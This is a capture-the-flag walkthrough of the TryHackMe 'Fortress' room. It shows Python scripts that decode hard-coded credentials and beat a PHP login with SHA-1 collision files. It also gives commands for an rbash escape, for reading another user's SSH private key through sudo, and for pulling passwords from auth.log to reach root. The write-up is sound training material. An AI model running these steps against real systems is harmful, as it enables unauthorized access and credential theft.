<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>fortress</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>fortress</h1><br/><strong><h1>THM: Fortress</h1></strong><br /><br /><strong>Note:</strong> As suggested in the room, we need to add to /etc/hosts the following.<br /><br /><strong>10.10.113.98   fortress</strong><br /><strong>10.10.113.98   temple.fortress</strong><br /><br /><strong><h2>Enumeration</h2></strong><br /><br /><strong>Rustscan &amp; Nmap</strong><br /><img src="images/45-1.png" alt="images/45-1.png" /><br /><br /><br /><strong>Port Analysis:</strong><br />22 		- 	SSH Server<br />5581 	-	FTP Server (With Anonymous Login allowed)<br />5752	-	TCP Service (Telnet for details)<br />7331	-	Web Server<br /><br /><strong>Enumerating TCP Service on 5752</strong><br />The TCP Service asks for credentials.<br /><img src="images/45-2.png" alt="images/45-2.png" /><br /><br /><strong>FTP</strong><br /><img src="images/45-3.png" alt="images/45-3.png" /><br /><br />We got 2 files.<br /><br /><strong>marked.txt</strong> is related to the story and is not mandatory for the CTF<br /><strong>.file</strong> is however an intresting file.<br /><br /><img src="images/45-4.png" alt="images/45-4.png" /><br /><br />It is a python byte-compiled file. It can be uncompiled using <strong>uncompyle2</strong><br /><br /><strong>uncompyle2 .file &gt; output.py</strong><br /><br /><img src="images/45-5.png" alt="images/45-5.png" /><br /><br />By examing the code, its clear that, its the same program that is running on the <strong>TCP port 5752</strong><br />We have the credentials here in <strong>Long</strong> format &amp; the program takes our input, then converts it to <strong>Long</strong> before matching for authentication.<br /><br />We can use python to reverse the process. We will use the function <strong>long_to_bytes</strong> from the same module <strong>Crypto.Util.number</strong><br /><br /><strong>Python Code For Credential Harvesting:</strong><br /><br /><em>from Crypto.Util.number import long_to_bytes<br /><br />username = long_to_bytes(232340432076717036154994)<br />print(&quot;Username: &quot; + username.decode(&quot;utf-8&quot;))<br /><br />password = long_to_bytes(10555160959732308261529999676324629831532648692669445488)<br />print(&quot;Password: &quot; + password.decode(&quot;utf-8&quot;))</em><br /><br /><br /><strong>Running the program</strong><br /><img src="images/45-6.png" alt="images/45-6.png" /><br /><br />It seems we found the credentails for TCP Program running at port 5752. Lets Login.<br /><strong>Enumerating TCP Service on 5752</strong><br /><img src="images/45-7.png" alt="images/45-7.png" /><br /><br />Now, we found a text: “<strong>t3mple_0f_y0ur_51n5</strong>”<br /><br /><strong>Website Enumeration</strong><br /><img src="images/45-8.png" alt="images/45-8.png" /><br /><br />We get a default page at port 7331. I used the string found “<strong>t3mple_0f_y0ur_51n5</strong>” as directory, but is gave server error/no results.<br />However, if we add an <strong>extention</strong> to the string found, we found intresting results.<br /><br /><strong>Adding .php extentsion</strong><br />t3mple_0f_y0ur_51n5.php<br /><br /><img src="images/45-9.png" alt="images/45-9.png" /><br /><br />We go to a blank page named chapter-2. However, if we view source we find <strong>commented</strong> <strong>html</strong> <strong>code</strong>.<br /><img src="images/45-10.png" alt="images/45-10.png" /><br /><br />Next,<br /><strong>Adding .html extentsion</strong><br />t3mple_0f_y0ur_51n5.html<br /><br /><img src="images/45-11.png" alt="images/45-11.png" /><br /><br />We land in a login page. However, if we view source we find <strong>commented</strong> <strong>php</strong> <strong>code</strong>.<br /><img src="images/45-12.png" alt="images/45-12.png" /><br /><br /><br />Examining the above I conclude that the <strong>PHP Code</strong> is used for authentication purpose and <strong>HTML code</strong> is used as a Login page using <strong>GET Request</strong>.<br /><br /><strong><h2>Foothold</h2></strong><br /><strong>SHA-1 Collision</strong><br /><br /><br />What it’s doing is that , taking two GET parameters <strong>user</strong> and <strong>pass</strong> doing a type check also checking it&#39;s<strong> SHA-1 hash</strong> if they are <strong>similar</strong> which is what we call <strong>hash collision</strong> and back in 2017 someone discovered a <strong>collision in SHA-1</strong> by calculating the hash of two pdf files.<br /><br /><img src="images/45-13.png" alt="images/45-13.png" /><br /><br />Link to get the pdf files: <strong>https://shattered.it/</strong><br /><br />Note: Since we will be using PDF files as input to a web page login form, we need to make the web request in python as we cannot do the same in a browser.<br /><br /><strong>Python Code for Web Request:</strong><br /><em>import requests<br /><br /># Fetching 2 pdf&#39;s file which cause SHA-1 collision<br /><br />pdf1 = requests.get(&quot;https://shattered.it/static/shattered-1.pdf&quot;)<br />pdf2 = requests.get(&quot;https://shattered.it/static/shattered-2.pdf&quot;)<br /><br /># Assinging pdf&#39;s content into the GET parameters<br /><br />params = {&#39;user&#39;: pdf1.content, &#39;pass&#39;: pdf2.content}<br />r = requests.get(&quot;http://temple.fortress:7331/t3mple_0f_y0ur_51n5.php/&quot;,params=params)<br />print(r.text)</em><br /><br /><br /><strong>We run it</strong><br /><img src="images/45-14.png" alt="images/45-14.png" /><br /><br />As we are using GET, the entire PDF is sent in URL which exceeds the Limit of <strong>8KB</strong><br /><strong>Note:</strong> Maximum capacity of <strong>url request </strong>is <strong>8 KB</strong> while we exceed this limit as combined size of those files is <strong>825 KB</strong><br /><br />Upon Further research, I found that a <strong>certain part</strong> of both the <strong>PDFs</strong> cause this <strong>collision</strong>. This turns out to be the <strong>first 192 octets</strong>. I will test the same by cutting the PDF with <strong>xxd</strong> and matching the fragments as below. <br /><br /><strong>Note:</strong> We will download the files and make the operations then host locally.<br /><img src="images/45-15.png" alt="images/45-15.png" /><br /><br />Just to verify, we can confirm that the default PDFs without any modifications indeed have SHA-1 Collision as we can see the SHA-1 output for both is same. Now, lets truncate it.<br /><br /><strong>xxd -l 192 shattered-1.pdf &gt; 1-pdf.192<br />xxd -l 192 shattered-2.pdf &gt; 2-pdf.192</strong><br /><br /><strong>-l len | -len len<br />      Stop after writing len octets.</strong><br /><br />Testing if still the collision occurs.<br /><img src="images/45-16.png" alt="images/45-16.png" /><br /><br />Indeed, the SHA-1 Collision occurs, Now we can send it to the webserver as the size is reduced.<br /><br />We change the python requester.<br /><em>import requests<br /><br /># Fetching 2 pdf&#39;s file which cause SHA-1 collision<br /><br />pdf1 = requests.get(&quot;https://localhost/1-pdf.192&quot;)<br />pdf2 = requests.get(&quot;https://localhost/2-pdf.192&quot;)<br /><br /># Assinging pdf&#39;s content into the GET parameters<br /><br />params = {&#39;user&#39;: pdf1.content, &#39;pass&#39;: pdf2.content}<br />r = requests.get(&quot;http://temple.fortress:7331/t3mple_0f_y0ur_51n5.php/&quot;,params=params)<br />print(r.text)</em><br /><br /><strong>Running</strong><br /><img src="images/45-17.png" alt="images/45-17.png" /><br /><br />We again got an error stating the username and password cannot be same. We need to expand the PDFs more.<br />This is the <strong>first</strong> <strong>error</strong> of the <strong>Commented PHP Code</strong><br /><br />Lets change the PDF files to include more bytes so that they are actually different, so that we will evade the first check.<br /><br /><strong>xxd -l 320 shattered-1.pdf | xxd -r &gt; 1-pdf.320<br />xxd -l 320 shattered-2.pdf | xxd -r &gt; 2-pdf.320</strong><br /><br /><strong>-r | -revert<br />      Reverse operation: convert (or patch) hexdump into  binary. If not  writing<br />      to stdout, xxd writes into its output file without truncating it.<br />      Use the combination -r -p to read plain hexadecimal dumps without line number<br />      information and without a particular column layout.<br />      Additional Whitespace and line-breaks are allowed anywhere.</strong><br /><br /><strong>Note:</strong> We pipe the data after converting to binary into our new input files. (Else it shows Invalid Password: Without <strong>xxd -r</strong>)<br /><br /><strong>Change in Python Web Request Code:</strong><br /><em>import requests<br /><br /># Fetching 2 pdf&#39;s file which cause SHA-1 collision<br /><br />pdf1 = requests.get(&quot;http://localhost/1-pdf.320&quot;)<br />pdf2 = requests.get(&quot;http://localhost/2-pdf.320&quot;)<br /><br /># Assinging pdf&#39;s content into the GET parameters<br /><br />params = {&#39;user&#39;: pdf1.content, &#39;pass&#39;: pdf2.content}<br />r = requests.get(&quot;http://temple.fortress:7331/t3mple_0f_y0ur_51n5.php/&quot;,params=params)<br />print(r.text)</em><br /><br /><strong>Running</strong><br /><img src="images/45-18.png" alt="images/45-18.png" /><br /><br />Now, we got the <strong>second</strong> <strong>error</strong> of the <strong>Commented PHP Code</strong>.<br />Its due to the username &amp; password length. According to the <strong>Commented PHP Code</strong>, our <strong>username</strong> should be <strong>&gt;= 500 charecters</strong> and <strong>password</strong> should be <strong>&gt;= 600  charecters</strong>.<br /><br />We modify our PDF inputs.<br /><br /><strong>xxd -l 700 shattered-1.pdf | xxd -r &gt; 1-pdf.700<br />xxd -l 700 shattered-2.pdf | xxd -r &gt; 2-pdf.700</strong><br /><br />We change the python code accordingly to use the above files as input.<br /><br /><strong>Running</strong><br /><img src="images/45-19.png" alt="images/45-19.png" /><br /><br />Now, we got the <strong>third</strong> <strong>error</strong> of the <strong>Commented PHP Code</strong>.<br />Its regarding badchars in the PDF.<br /><br />Finally, I searched for SHA-1 Collision online and found another set of files which solve the above issues.<br /><strong>https://sha-mbles.github.io/</strong><br />From here I downloaded <strong>messageA</strong> and <strong>messageB</strong><br /><br />Analyze the files for <strong>length</strong> and <strong>SHA-1 collision</strong>.<br /><img src="images/45-20.png" alt="images/45-20.png" /><br /><br />As we can see, the size satisfies our conditions of<strong> &gt;=500 &amp; &gt;=600</strong> respectively and the files indeed have <strong>SHA-1 Collision.</strong><br /><br /><strong>Final Python Code:</strong><br />import requests<br /><br /># Fetching 2 pdf&#39;s file which cause SHA-1 collision<br /><br />pdf1 = requests.get(&quot;http://localhost/messageA&quot;)<br />pdf2 = requests.get(&quot;http://localhost/messageB&quot;)<br /><br /># Assinging pdf&#39;s content into the GET parameters<br /><br />params = {&#39;user&#39;: pdf1.content, &#39;pass&#39;: pdf2.content}<br />r = requests.get(&quot;http://temple.fortress:7331/t3mple_0f_y0ur_51n5.php/&quot;,params=params)<br />print(r.text)<br /><br /><strong>Running</strong><br /><img src="images/45-21.png" alt="images/45-21.png" /><br /><br />Finally, we are able to login and get the string “<strong>m0td_f0r_j4x0n.txt</strong>”<br /><br />We use the link with our URL: <strong>http://fortress:7331/m0td_f0r_j4x0n.txt</strong><br /><img src="images/45-22.png" alt="images/45-22.png" /><br /><br /><br />We found the Private Key for the User: <strong>h4rdy</strong><br />Lets try to Login with <strong>SSH</strong><br /><br />Copy the private key to a file <strong>id_h4rdy</strong> &amp; change its permission to <strong>chmod 600 id_h4rdy</strong><br />Then Logon to SSH using <strong>ssh -i id_h4rdy h4rdy@fortress</strong><br /><br /><img src="images/45-23.png" alt="images/45-23.png" /><br /><br /><strong><h2>Privilege Escalation</h2></strong><br /><br />We successfully logged on the machine, however I find that we are unable to run any command. Later checking i found we are runnning <strong>restricted bash</strong>.<br /><br /><img src="images/45-24.png" alt="images/45-24.png" /><br /><br />We confirm that we are running <strong>rbash</strong> &amp; the <strong>PATH</strong> &amp; <strong>SHELL</strong> variables are <strong>READ ONLY</strong><br /><br /><strong>Solution</strong><br />Log out of SSH and Login again using a <strong>pseudo terminal option</strong> in <strong>SSH</strong> Login.<br />Using <strong>-t</strong> which enables &quot;<strong>pseudo-tty allocation</strong>&quot;<br /><br />Format: <br /><br /><strong>ssh -i id_h4rdy h4rdy@fortress -t bash &#39;--noprofile&#39;</strong><br /><img src="images/45-25.png" alt="images/45-25.png" /><br /><br />With the Pseudo Terminal, we are able to change the <strong>SHELL</strong> &amp; <strong>PATH</strong> variables. We set them as above. Now we have a fully functional terminal.<br /><br /><strong>Lateral Movement</strong><br /><img src="images/45-26.png" alt="images/45-26.png" /><br /><br />I checked for Sudo access for <strong>h4rdy</strong>. He was allowed to run <strong>/bin/cat</strong> as user <strong>j4x0n</strong> without any password. Thus I used the follwing command to read his private ssh key. <br /><br /><strong>sudo -u j4x0n /bin/cat /home/j4x0n/.ssh/id_rsa</strong><br /><br />I reapeat the same steps on my Local Kali machine to Login as user <strong>j4x0n</strong><br />Copy the private key to a file <strong>id_j4x0n</strong> &amp; change its permission to <strong>chmod 600 id_j4x0n</strong><br />Then Logon to SSH using <strong>ssh -i id_j4x0n j4x0n@fortress</strong><br /><br /><img src="images/45-27.png" alt="images/45-27.png" /><br /><br />I successfully, logged in as user <strong>j4x0n</strong>. I notice that the user is member of group <strong>adm</strong><br />This group has read access to <strong>auth logs</strong>. So I enumerate it.<br /><br /><br /><strong>ls -l /var/log/auth.log</strong><br /><img src="images/45-28.png" alt="images/45-28.png" /><br /><br />I will view the file with <strong>more</strong> &amp; search for Login credentials.<br /><br /><strong>I found veekay&#39;s password</strong><br /><img src="images/45-29.png" alt="images/45-29.png" /><br /><br /><strong>I found h4rdy&#39;s password</strong><br /><img src="images/45-30.png" alt="images/45-30.png" /><br /><br />Finally<br /><strong>I found j4x0n&#39;s password</strong><br /><img src="images/45-31.png" alt="images/45-31.png" /><br /><br />Lets check sudo for <strong>j4x0n</strong>. It needed password. Once I provided password, as we can see <strong>j4x0n</strong> has sudo access for all commands.So i run a <strong>sudo</strong> <strong>bash</strong> to become <strong>root</strong>.<br /><br /><img src="images/45-32.png" alt="images/45-32.png" /><br /><br />Thanks!!</div>
</body>
</html>
